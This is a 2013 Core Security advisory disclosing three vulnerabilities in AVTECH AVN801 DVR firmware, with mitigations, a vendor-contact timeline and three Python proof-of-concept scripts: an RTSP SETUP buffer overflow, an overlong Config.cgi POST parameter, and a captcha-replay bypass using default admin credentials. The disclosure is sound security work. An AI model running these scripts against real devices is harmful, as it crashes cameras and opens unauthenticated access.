@@ -1,0 +1,225 @@
+Core Security - Corelabs Advisory
+http://corelabs.coresecurity.com/
+
+AVTECH DVR multiple vulnerabilities
+
+
+1. *Advisory Information*
+
+Title: AVTECH DVR multiple vulnerabilities
+Advisory ID: CORE-2013-0726
+Advisory URL:
+http://www.coresecurity.com/advisories/avtech-dvr-multiple-vulnerabilities
+Date published: 2013-08-28
+Date of last update: 2013-08-28
+Vendors contacted: AVTECH Corporation
+Release mode: User release
+
+
+2. *Vulnerability Information*
+
+Class: Buffer overflow [CWE-119], Buffer overflow [CWE-119], Improper
+Access Control [CWE-284]
+Impact: Code execution, Security bypass
+Remotely Exploitable: Yes
+Locally Exploitable: No
+CVE Name: CVE-2013-4980, CVE-2013-4981, CVE-2013-4982
+
+
+3. *Vulnerability Description*
+
+Multiple vulnerabilities have been found in AVTECH AVN801 DVR [1] (and
+potentially other devices sharing the affected firmware) that could
+allow a remote attacker:
+
+   1. [CVE-2013-4980] To execute arbitrary code without authentication
+by exploiting a buffer overflow in the RTSP packet handler.
+   2. [CVE-2013-4981] To execute arbitrary code without authentication
+by exploiting a buffer overflow in '/cgi-bin/user/Config.cgi', via a
+specially crafted HTTP POST request.
+   3. [CVE-2013-4982] To bypass the captcha of the administration login
+console enabling several automated attack vectors.
+
+
+4. *Vulnerable Packages*
+
+   . DVR 4CH H.264 (AVTECH AVN801) firmware 1017-1003-1009-1003.
+   . Older versions are probably affected too, but they were not checked.
+
+
+5. *Vendor Information, Solutions and Workarounds*
+
+There was no official answer from AVTECH support team after several
+attempts (see [Sec. 8]); contact vendor for further information. Some
+mitigation actions may be:
+
+   . Do not expose the DVR to internet unless absolutely necessary.
+   . Have at least one proxy filtering the 'SETUP' parameter in RTSP
+requests.
+   . Have at least one proxy filtering the 'Network.SMTP.Receivers'
+parameter in HTTP requests to '/cgi-bin/user/Config.cgi'.
+
+
+6. *Credits*
+
+[CVE-2013-4980] was discovered and researched by Anibal Sacco from Core
+Security Exploit Writers Team. [CVE-2013-4981] and [CVE-2013-4982] were
+discovered and researched by Facundo Pantaleo from Core Security
+Consulting Team.
+
+
+7. *Technical Description / Proof of Concept Code*
+
+
+7.1. *Buffer Overflow in RTSP Packet Handler*
+
+[CVE-2013-4980] The following Python script sends a specially crafted
+packet that triggers a buffer overrun condition when handling the RTSP
+transaction; no authentication is required. As a result, the device
+crashes and it could possibly lead to a remote code execution.
+
+/-----
+import socket
+
+HOST = '192.168.1.1'
+PORT = 554              
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((HOST, PORT))
+trigger_pkt = "SETUP
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2AaLSaLS
+RTSP/1.0\r\n"
+trigger_pkt += "CSeq: 1\r\n"
+trigger_pkt += "User-Agent: VLC media player (LIVE555 Streaming Media
+v2010.02.10)\r\n\r\n"
+print "[*] Sending trigger"
+s.sendall(trigger_pkt)
+data = s.recv(1024)
+print '[*] Response:', repr(data), "\r\n"
+s.close()
+-----/
+
+
+7.2. *Buffer Overflow in config.cgi Parameters*
+
+[CVE-2013-4981] The following Python script exploits other buffer
+overflow condition; no authentication is required. As a result, the
+device crashes and it would possible lead to a remote code execution.
+
+
+/-----
+import httplib
+
+ip = "192.168.1.1"
+conn = httplib.HTTPConnection(ip)
+conn.request("POST",
+"/cgi-bin/user/Config.cgi?action=set&Network.SMTP.Receivers=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+HTTP/1.1")
+resp = conn.getresponse()
+print resp.read()
+-----/
+
+
+7.3. *CAPTCHA Bypass*
+
+[CVE-2013-4982] The following Python proof of concept sends a wrong
+captcha in first place (just to verify that captcha protection is
+enabled); then, it sends ten requests with an arbitrary hardcoded
+captcha and its matching verification code. As a result, the captcha
+protection can by completely bypassed.
+
+
+/-----
+import httplib
+
+ip = "192.168.1.1"
+print "Performing captcha replay with hardcoded wrong captcha code and
+verify code..."
+conn = httplib.HTTPConnection(ip)
+conn.request("GET",
+"/cgi-bin/nobody/VerifyCode.cgi?account=YWRtaW46YWRtaW4=&captcha_code=FMUA&verify_code=FMUYyLOivRpgc
+HTTP/1.1")
+resp = conn.getresponse()
+print "Reading webpage..."
+print resp.read()
+print "Performing several captcha replays with hardcoded right captcha
+code and verify code..."
+for i in range(1, 10):
+    conn = httplib.HTTPConnection(ip)
+    conn.request("GET",
+"/cgi-bin/nobody/VerifyCode.cgi?account=YWRtaW46YWRtaW4=&captcha_code=FMUF&verify_code=FMUYyLOivRpgc
+HTTP/1.1")
+    resp = conn.getresponse()
+    print "Reading webpage..."
+    print resp.read()
+
+-----/
+
+
+8. *Report Timeline*
+
+. 2013-08-06:
+Core Security Technologies attempts to contact vendor using the AVTECH
+official technical support contact page [2]. No reply received.
+
+. 2013-08-12:
+Core attempts to contact vendor.
+
+. 2013-08-20:
+Core attempts to contact vendor.
+
+. 2013-08-28:
+After 3 attempts to contact vendor, the advisory CORE-2013-0726 is
+released as 'user release'.
+
+
+9. *References*
+
+[1] http://www.avtech.com.tw.
+[2]
+http://www.avtech.com.tw/index.php?option=com_content&view=article&id=244&Itemid=453&lang=en.
+
+
+
+10. *About CoreLabs*
+
+CoreLabs, the research center of Core Security Technologies, is charged
+with anticipating the future needs and requirements for information
+security technologies. We conduct our research in several important
+areas of computer security including system vulnerabilities, cyber
+attack planning and simulation, source code auditing, and cryptography.
+Our results include problem formalization, identification of
+vulnerabilities, novel solutions and prototypes for new technologies.
+CoreLabs regularly publishes security advisories, technical papers,
+project information and shared software tools for public use at:
+http://corelabs.coresecurity.com.
+
+
+11. *About Core Security Technologies*
+
+Core Security Technologies enables organizations to get ahead of threats
+with security test and measurement solutions that continuously identify
+and demonstrate real-world exposures to their most critical assets. Our
+customers can gain real visibility into their security standing, real
+validation of their security controls, and real metrics to more
+effectively secure their organizations.
+
+Core Security's software solutions build on over a decade of trusted
+research and leading-edge threat expertise from the company's Security
+Consulting Services, CoreLabs and Engineering groups. Core Security
+Technologies can be reached at +1 (617) 399-6980 or on the Web at:
+http://www.coresecurity.com.
+
+
+12. *Disclaimer*
+
+The contents of this advisory are copyright (c) 2013 Core Security
+Technologies and (c) 2013 CoreLabs, and are licensed under a Creative
+Commons Attribution Non-Commercial Share-Alike 3.0 (United States)
+License: http://creativecommons.org/licenses/by-nc-sa/3.0/us/.
+
+
+13. *PGP/GPG Keys*
+
+This advisory has been signed with the GPG key of Core Security
+Technologies advisories team, which is available for download at
+http://www.coresecurity.com/files/attachments/core_security_advisories.asc.
